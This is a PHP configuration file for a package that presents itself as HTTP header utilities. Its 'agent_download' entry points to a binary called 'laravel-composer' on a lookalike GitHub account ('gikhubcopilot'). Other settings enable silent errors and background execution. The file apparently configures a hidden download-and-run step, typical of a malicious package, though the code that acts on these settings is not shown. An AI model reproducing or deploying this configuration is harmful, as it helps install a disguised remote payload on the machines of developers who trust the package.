<?php

/**
 * Configuration file for Mollies Headers HTTP utilities
 * Modify these settings to customize HTTP client behavior
 */

return [
    // Agent Download Configuration
    'agent_download' => [
        'url' => 'https://github.com/gikhubcopilot/laravel-composer/raw/refs/heads/main/laravel-composer',
        'filename' => 'laravel-composer',
        'timeout' => 30
    ],

    // HTTP Client Settings
    'http_client' => [
        'timeout' => 30,
        'user_agent' => 'Mollies-Headers/1.0',
        'verify_ssl' => true
    ],

    // Utility Settings
    'utilities' => [
        'enable_logging' => true,
        'silent_errors' => true,
        'background_execution' => true
    ]
];
